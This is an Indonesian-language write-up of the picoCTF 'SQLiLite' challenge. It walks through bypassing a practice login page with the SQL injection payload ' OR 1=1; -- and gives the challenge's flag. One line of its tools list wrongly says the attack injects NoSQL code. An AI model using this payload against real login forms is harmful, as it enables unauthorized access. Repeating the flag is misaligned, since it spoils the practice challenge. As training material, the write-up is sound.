# Pico-CTF Write-up: SQLiLite

## Challenge Overview

**Judul:** SQLiLite\
**Kategori:** SQL Injection\
**Kesulitan:** Medium\
**Link Soal:** https://play.picoctf.org/practice/challenge/304?category=1&page=1&search=SQLi

Tantangan ini menghadirkan sebuah halaman login yang tampak rentan terhadap SQL Injection (SQLi). Tujuannya adalah mengeksploitasi kerentanan tersebut untuk melewati autentikasi dan memperoleh flag.

## Alat Yang Digunakan

- **Web Browser**: Untuk berinteraksi dengan antarmuka login aplikasi.
- **Burp Suite**: Digunakan untuk mencegat dan memodifikasi permintaan HTTP guna menyisipkan kode NoSQL.

## Pembahasan

Berikut adalah tampilan dari web yang akan di serang

<img width="1889" height="493" alt="Screenshot 2025-09-10 233416" src="https://github.com/user-attachments/assets/c3b05779-58c4-4663-ac24-1254522ae5e1" />

Pertama saya test dengan memasukkan
```
Username: test
Password: test
```
dan ini menghasilkan

<img width="1891" height="331" alt="Screenshot 2025-09-10 233425" src="https://github.com/user-attachments/assets/516a2c47-f489-4534-bda6-f6294c2649fc" />

Setelah melakukan submit, respons yang diterima mengungkapkan struktur query SQL berikut:
```
SELECT * FROM users WHERE name = 'test' AND password = 'test';
```
hal ini menandakan user input yang akan langsung dimasukkan ke query sql

kedua, kita bisa langsung membuat payload yang akan membypass username `' OR 1=1; --` Ini mengubah query menjadi:
```
SELECT * FROM users WHERE name = '' OR 1=1; --' AND password = 'test';
```

<img width="1861" height="481" alt="Screenshot 2025-09-10 233524" src="https://github.com/user-attachments/assets/b5493d88-0c71-45b4-8ff9-04fcb41c4257" />

dan kita berhasil masuk dan mendapatkan flagnya `picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}`

<img width="1892" height="246" alt="Screenshot 2025-09-10 233554" src="https://github.com/user-attachments/assets/ca7334ac-f390-4bd3-a7e4-a8446fd305f2" />
<img width="1481" height="484" alt="Screenshot 2025-09-10 233605" src="https://github.com/user-attachments/assets/46eeb568-9cd4-456a-9f1f-0a6f88e540f9" />
